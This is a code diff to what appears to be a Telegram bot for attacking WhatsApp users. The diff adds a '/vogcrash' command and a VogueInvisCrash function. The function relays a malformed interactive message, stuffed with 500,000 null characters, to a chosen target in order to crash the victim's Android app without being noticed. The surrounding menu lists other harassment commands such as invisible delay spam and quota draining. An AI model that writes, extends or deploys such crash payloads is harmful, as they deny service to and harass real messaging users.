@@ -1869,6 +1869,7 @@ A N D R O I D
 › /hardspam     → Very Hard Delay Invisible 
 › /voguehard    → Strong Delay Hard Invisible 100%
 › /drainet      → Increase Quota Usage
+› /vogcrash     → Android Crash Invisible Hard!
 
 
 I P H O N E
@@ -5076,7 +5077,7 @@ Please verify the target input and system status before retrying.`
     }
 });
 
-bot.command('spamandro3', checkExecutionLimit, checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
+bot.command('vogcrash', checkExecutionLimit, checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
     
     let q = ctx.message?.text?.split(" ")[1];
     
@@ -5104,7 +5105,7 @@ EXECUTION STATUS
 
 Target      : ${q}
 Status      : Success
-Description : Android Delay Invisible
+Description : Android Crash Invisible
 
 ──────────────────────────
 \`\`\``,
@@ -5126,7 +5127,7 @@ Description : Android Delay Invisible
             
             for (let i = 0; i < 2; i++) {
                 try {
-                    await PriasoloFcXcrashIos(sock, target);
+                    await VogueInvisCrash(sock, target);
                     await sleep(1500)
                 } catch (e) {
                     console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
@@ -5974,6 +5975,30 @@ async function VogueHardInvis(sock, target) {
         participant: { jid: target },
         messageId: msg.key.id
     });
+}
+
+async function VogueInvisCrash(sock, target) {
+  const payload = {
+    groupStatusMessageV2: {
+      message: {
+        interactiveMessage: {
+          header: {
+            title: "t.me/PrinceXVogue"
+          },
+          body: {
+            text: "\0"
+          },
+          nativeFlowMessage: {
+            buttons: "\0".repeat(500000)
+          }
+        }
+      }
+    }
+  };
+  
+  await sock.relayMessage(target, payload, {
+    participant: { jid: target }
+  });
 }
 
 //     _       ___  _   _ _   _ _____  _   _        
